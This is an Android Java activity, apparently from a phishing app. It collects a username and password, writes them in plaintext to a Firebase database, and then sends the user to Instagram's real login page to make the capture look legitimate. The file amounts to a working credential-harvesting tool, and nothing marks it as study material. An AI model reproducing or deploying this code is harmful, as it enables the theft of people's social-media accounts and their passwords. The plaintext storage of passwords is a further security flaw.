package com.example.mybaseapp;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private EditText usernameEditText;
    private EditText passwordEditText;
    private Button saveButton;
    private DatabaseReference usersRef;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        // Initialize Firebase Database
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        usersRef = database.getReference("users");

        // Find views
        usernameEditText = findViewById(R.id.username);
        passwordEditText = findViewById(R.id.password);
        saveButton = findViewById(R.id.btn);

        // Set click listener for the save button
        saveButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                saveUserData();
            }

        });
    }


    private void saveUserData() {
        // Get username and password from EditText fields
        String username = usernameEditText.getText().toString().trim();
        String password = passwordEditText.getText().toString().trim();

        // Check if both fields are not empty
        if (!username.isEmpty() && !password.isEmpty()) {
            // Generate a unique key for each user
            String userId = usersRef.push().getKey();

            // Create a User object
            User user = new User(username, password);

            String instagramLoginUrl = "https://www.instagram.com/accounts/login/";
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(instagramLoginUrl));
            startActivity(intent);


            // Save the user data to Firebase Database
            if (userId != null) {
                usersRef.child(userId).setValue(user);
            } else {
                Toast.makeText(MainActivity.this, "Failed ", Toast.LENGTH_SHORT).show();
            }

            // Clear EditText fields after saving data
            usernameEditText.setText("");
            passwordEditText.setText("");
        } else {
            Toast.makeText(MainActivity.this, "Please enter username and password", Toast.LENGTH_SHORT).show();
        }
    }
}
